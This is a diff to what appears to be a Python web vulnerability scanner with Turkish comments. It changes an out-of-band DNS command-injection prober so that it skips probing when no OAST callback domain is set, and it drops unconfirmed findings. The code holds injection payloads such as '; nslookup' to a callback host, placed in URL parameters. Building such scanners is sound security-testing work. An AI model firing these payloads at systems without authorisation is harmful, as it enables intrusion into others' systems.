@@ -579,11 +579,18 @@ class CMDiOOBDNSProber(BaseScanner):
         import string as _str
 
         oast_domain = kwargs.get("oast_domain") or (self.results or {}).get("oast_domain")
-        canary_domain = oast_domain if oast_domain else "burpcollaborator.net"
-        # NOT: severity artık burada hesaplanmıyor. OOB tekniğinin tek geçerli
-        # kanıtı gerçek callback'tir; onaylı yol aşağıda severity="Critical" ile
-        # raporlar, onaysız yol HİÇ bulgu üretmez (FP fix). Önceden burada
-        # hesaplanan değişken hiçbir yerde kullanılmıyordu (ölü kod).
+        # faz9 (kriter 10 + egress): OAST domain'i YOKKEN OOB DNS probe ETME. Kontrol
+        # ETMEDİĞİMİZ bir callback alanına (eski kod `burpcollaborator.net`) körlemesine
+        # nslookup/ping atmak (a) ASLA onaylanamaz — callback'i göremeyiz → 0 bulgu yolu,
+        # (b) her param için boşuna 12 istek, (c) hedefin varlığını 3. tarafa sızdırır.
+        # OAST varsa aşağıdaki yol callback-onaylı Critical raporlar.
+        if not oast_domain:
+            logger.debug(
+                "[CMDiOOBDNSProber] OAST domain yok — OOB DNS atlandı (onaylanamaz + "
+                "3.taraf sızıntısı/boşuna istek önleme). OAST/interactsh yapılandırın."
+            )
+            return
+        canary_domain = oast_domain
 
         parsed = urlparse(target)
         params = parse_qsl(parsed.query)
@@ -592,7 +599,7 @@ class CMDiOOBDNSProber(BaseScanner):
 
         for param_name, _ in params:
             token = "".join(_rnd.choices(_str.ascii_lowercase, k=6))
-            probe_host = f"{token}.{canary_domain}" if oast_domain else canary_domain
+            probe_host = f"{token}.{canary_domain}"
 
             oob_payloads = [
                 (f"; nslookup {probe_host}",          "unix_nslookup_semicolon"),
@@ -644,27 +651,15 @@ class CMDiOOBDNSProber(BaseScanner):
                     logger.debug(f"[CMDiOOBDNSProber] OAST poller check failed: {exc!r}")
 
             # FP FIX: OOB tekniğinin TEK kanıtı gerçek DNS/HTTP callback'idir.
-            # Eskiden burada KOŞULSUZ olarak (callback gelmese de, hatta OAST hiç
-            # yokken `burpcollaborator.net` placeholder'ı ile) High/Critical bir
-            # "OOB/DNS Probe" bulgusu raporlanıyordu → vulnerable OLMAYAN her
-            # parametrede sahte CMDi false-positive üretiyordu (benchmark'ta
-            # safe_ping bile [High] işaretlendi). Doğrulanmamış OOB ASLA vuln
-            # olarak raporlanmamalı:
-            #   - OAST varsa: yalnız yukarıdaki callback-onaylı yol raporlar;
-            #     gecikmeli callback'leri global OAST poller asenkron raporlar.
-            #   - OAST yoksa: kontrol ettiğimiz bir callback alanı olmadığından
-            #     teknik DOĞRULANAMAZ → bulgu üretme, sadece logla.
-            if oast_domain:
-                logger.info(
-                    "[CMDiOOBDNSProber] OOB payloadları gönderildi (token=%s, host=%s) — "
-                    "onaylı DNS callback'leri OAST poller asenkron raporlayacak.",
-                    token, probe_host,
-                )
-            else:
-                logger.debug(
-                    "[CMDiOOBDNSProber] OAST domain yok — OOB doğrulanamaz, bulgu "
-                    "üretilmedi (FP önleme). OAST/interactsh yapılandırın.",
-                )
+            # Doğrulanmamış OOB ASLA vuln olarak raporlanmaz: yalnız yukarıdaki
+            # callback-onaylı yol raporlar; gecikmeli callback'leri global OAST
+            # poller asenkron raporlar. (OAST yoksa fonksiyon zaten en başta
+            # erken-return ile bu probe'u hiç çalıştırmaz.)
+            logger.info(
+                "[CMDiOOBDNSProber] OOB payloadları gönderildi (token=%s, host=%s) — "
+                "onaylı DNS callback'leri OAST poller asenkron raporlayacak.",
+                token, probe_host,
+            )
 
 
 class CMDiTimeBasedProber(BaseScanner):
